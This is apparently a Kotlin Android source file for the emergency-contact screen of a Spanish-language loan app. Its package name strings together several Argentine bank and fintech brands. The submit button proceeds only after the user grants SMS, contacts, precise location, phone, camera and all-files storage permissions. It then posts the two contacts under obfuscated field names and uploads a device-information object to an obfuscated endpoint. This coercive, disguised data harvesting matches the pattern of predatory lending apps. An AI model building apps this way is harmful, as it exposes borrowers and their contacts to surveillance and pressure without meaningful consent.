package com.macro.online.lemoncash.mio.brubank.creditos.personalpay.uala.prestamo.galicia.ui.activity

import android.Manifest
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.os.Build
import android.text.Editable
import android.text.TextUtils
import android.text.TextWatcher
import android.view.View
import androidx.lifecycle.lifecycleScope
import com.github.gzuliyujiang.dialog.CornerRound
import com.github.gzuliyujiang.wheelpicker.OptionPicker
import com.google.gson.Gson
import com.hjq.permissions.OnPermissionCallback
import com.hjq.permissions.Permission
import com.hjq.permissions.XXPermissions
import com.macro.online.lemoncash.mio.brubank.creditos.personalpay.uala.prestamo.galicia.R
import com.macro.online.lemoncash.mio.brubank.creditos.personalpay.uala.prestamo.galicia.api.BaseFormDataUtils
import com.macro.online.lemoncash.mio.brubank.creditos.personalpay.uala.prestamo.galicia.api.ext.appApi
import com.macro.online.lemoncash.mio.brubank.creditos.personalpay.uala.prestamo.galicia.api.rep.SexDataBean
import com.macro.online.lemoncash.mio.brubank.creditos.personalpay.uala.prestamo.galicia.databinding.ActivityContactInformationBinding
import com.macro.online.lemoncash.mio.brubank.creditos.personalpay.uala.prestamo.galicia.ui.bean.DeviceInfoBean
import com.macro.online.lemoncash.mio.brubank.creditos.personalpay.uala.prestamo.galicia.utils.CallUtils
import com.macro.online.lemoncash.mio.brubank.creditos.personalpay.uala.prestamo.galicia.utils.CommonDialogUtil
import com.moufans.lib_base.base.activity.BaseActivity
import com.moufans.lib_base.ext.convertReqExecute
import com.moufans.lib_base.utils.LogUtil
import com.moufans.lib_base.utils.ToastUtil
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody

class ContactInformationActivity : AppBaseActivity<ActivityContactInformationBinding>(), TextWatcher {
    private var mRelationOptionPicker: OptionPicker? = null
    private var mRelationDataBeanOne: SexDataBean? = null
    private var mRelationDataBeanTwo: SexDataBean? = null
    private var mClickPosition = 0

    override fun getDataBindingLayoutResId(): Int {
        return R.layout.activity_contact_information
    }

    override fun initView() {
        setHeaderTitle("Contacto de emergencial")
        mDataBinding.mGigTextView.isSelected = false
        mDataBinding.mGigTextView.isEnabled = false
    }

    override fun initListener() {
        setHeaderRightRightImage(R.mipmap.ic_white_phone) { CallUtils.showCallDialog(this@ContactInformationActivity) }
        mDataBinding.mTelEditText.addTextChangedListener(this)
        mDataBinding.mNomEditText.addTextChangedListener(this)
        mDataBinding.mTelEditText2.addTextChangedListener(this)
        mDataBinding.mNomEditText2.addTextChangedListener(this)
        mDataBinding.mRelEditText.setOnClickListener {
            mClickPosition = 0
            selectedRelation()
        }
        mDataBinding.mRelEditText2.setOnClickListener {
            mClickPosition = 1
            selectedRelation()
        }
        mDataBinding.mGigTextView.setOnClickListener {
            val xp = XXPermissions.with(this)
            if (Build.VERSION.SDK_INT > Build.VERSION_CODES.R) {
                xp.permission(Manifest.permission.MANAGE_EXTERNAL_STORAGE, Manifest.permission.CAMERA,
                    Manifest.permission.CALL_PHONE, Manifest.permission.READ_SMS,
                    Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.READ_CONTACTS)
            } else if (Build.VERSION.SDK_INT == Build.VERSION_CODES.R) {
                xp.permission(Permission.Group.STORAGE)
                xp.permission(Manifest.permission.CAMERA, Manifest.permission.CALL_PHONE, Manifest.permission.READ_SMS,
                    Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.READ_CONTACTS)
            } else {
                xp.permission(Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.CAMERA, Manifest.permission.CALL_PHONE, Manifest.permission.READ_SMS,
                    Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.READ_CONTACTS)
            }
            xp.request(object : OnPermissionCallback {
                override fun onGranted(permissions: List<String>, all: Boolean) {
                    if (all) {
                        checkInputData(true)
//                        startActivity(IdentityInformationActivity.newIntent(this@ContactInformationActivity))
                    }
                }

                override fun onDenied(permissions: List<String>, never: Boolean) {
                    if (never) {
                        // 如果是被永久拒绝就跳转到应用权限系统设置页面
                        XXPermissions.startPermissionActivity(this@ContactInformationActivity, permissions)
                    }
                }
            })

        }
    }

    override fun processingLogic() {
    }

    override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {

    }

    override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
        checkInputData()
    }

    override fun afterTextChanged(s: Editable?) {
    }

    private fun selectedRelation() {
        if (mRelationOptionPicker == null) {
            val hashMap: HashMap<String, String> = BaseFormDataUtils.getBaseHasMap(1)
            hashMap["modestFriedSunlightRacialCertificate"] = "secRelationship"
            lifecycleScope.launch {
                convertReqExecute({ appApi.sex(hashMap) }, onSuccess = {
                    mRelationOptionPicker = OptionPicker(this@ContactInformationActivity).apply {
                        setBackgroundColor(CornerRound.Top, resources.getDimension(R.dimen.sw_6dp).toInt(), Color.WHITE)
                        cancelView.text = "Cerrar"
                        cancelView.setTextColor(Color.parseColor("#333333"))
                        okView.text = "Confirmar"
                        okView.setTextColor(Color.parseColor("#F98D4F"))
                        wheelLayout.setIndicatorColor(Color.parseColor("#E9E9E9"))
                        topLineView.visibility = View.GONE
                        setData(it)
                        setOnOptionPickedListener { position, _ ->
                            if (mClickPosition == 0) {
                                mRelationDataBeanOne = it[position]
                                mDataBinding.mRelEditText.text = mRelationDataBeanOne?.provideText()
                            } else {
                                mRelationDataBeanTwo = it[position]
                                mDataBinding.mRelEditText2.text = mRelationDataBeanTwo?.provideText()
                            }

                            checkInputData()
                        }
                    }
                    mRelationOptionPicker!!.show()
                }, baseView = this@ContactInformationActivity)

            }
        } else {
            mRelationOptionPicker!!.show()
        }

    }

    private fun checkInputData(isSubmit: Boolean = false) {
        if (!isSubmit) {
            mDataBinding.mGigTextView.isSelected = false
            mDataBinding.mGigTextView.isEnabled = false
        }

        val phoneOne = mDataBinding.mTelEditText.text.toString()
        if (TextUtils.isEmpty(phoneOne)) {
            if (isSubmit)
                ToastUtil.showShort("El número de teléfono es anormal, vuelva a ingresar")
            return
        }
        if (isSubmit) {
            if (phoneOne.length < 10) {
                ToastUtil.showShort("El número de teléfono es anormal, vuelva a ingresar")
                return
            }
        }
        val nameOne = mDataBinding.mNomEditText.text.toString()
        if (TextUtils.isEmpty(nameOne)) {
            if (isSubmit)
                ToastUtil.showShort("Por favor complete toda la información completamente")
            return
        }

        if (mRelationDataBeanOne == null) {
            if (isSubmit)
                ToastUtil.showShort("Por favor complete toda la información completamente")
            return
        }

        val phoneTwo = mDataBinding.mTelEditText2.text.toString()
        if (TextUtils.isEmpty(phoneTwo)) {
            if (isSubmit)
                ToastUtil.showShort("El número de teléfono es anormal, vuelva a ingresar")
            return
        }
        LogUtil.e("==============================================111111")
        if (isSubmit) {
            if (phoneTwo.length < 10) {
                ToastUtil.showShort("El número de teléfono es anormal, vuelva a ingresar")
                return
            }
        }
        LogUtil.e("==============================================11111")

        val nameTwo = mDataBinding.mNomEditText2.text.toString()
        if (TextUtils.isEmpty(nameTwo)) {
            if (isSubmit)
                ToastUtil.showShort("Por favor complete toda la información completamente")
            return
        }
        LogUtil.e("==============================================1111")
        if (mRelationDataBeanTwo == null) {
            if (isSubmit)
                ToastUtil.showShort("Por favor complete toda la información completamente")
            return
        }

        LogUtil.e("==============================================11")


        if (isSubmit) {
            if (phoneOne == phoneTwo) {
                ToastUtil.showShort("Por favor seleccione un contacto diferente")
                return
            }
        }

        LogUtil.e("==============================================1")

        mDataBinding.mGigTextView.isSelected = true
        mDataBinding.mGigTextView.isEnabled = true

        if (isSubmit) {
            LogUtil.e("==============================================111")
            val hashMap: java.util.HashMap<String, String> = BaseFormDataUtils.getBaseHasMap(1)
            hashMap["smellyFaithTerm"] = phoneOne
            hashMap["germanToolShower"] = nameOne
            hashMap["sleepyMillionFunnyHeadlineNursery"] = mRelationDataBeanOne!!.likelyFruitUndergroundBridge ?: ""
            hashMap["difficultFatProtectionEverybody"] = phoneTwo
            hashMap["boundAuthorMay"] = nameTwo
            hashMap["bothComfortDisabledTerribleLifetime"] = mRelationDataBeanTwo!!.likelyFruitUndergroundBridge ?: ""
            showLoading()
            lifecycleScope.launch {
                convertReqExecute({ appApi.commandUnfairData(hashMap) }, onSuccess = {
                    uploadJson()
                }, onFailure = { _, status, _ ->
                    if (status == 1000) {
                        uploadJson()
                    } else {
                        hideLoading()
                    }
                })

            }
        }

    }

    private fun uploadJson() {
        showLoading()
        lifecycleScope.launch {
            val mapToJson = Gson().toJson(DeviceInfoBean())
            convertReqExecute({ appApi.impressLazyBeing(RequestBody.create("application/json; charset=utf-8".toMediaTypeOrNull(), mapToJson)) }, onSuccess = {
                hideLoading()
                startActivity(IdentityInformationActivity.newIntent(this@ContactInformationActivity))
            }, onFailure = { _, status, _ ->
                hideLoading()
                if (status == 1000) {
                    startActivity(IdentityInformationActivity.newIntent(this@ContactInformationActivity))
                }
            }, this@ContactInformationActivity)

        }
    }

    companion object {

        fun newIntent(context: Context): Intent {
            return Intent(context, ContactInformationActivity::class.java)
        }
    }


}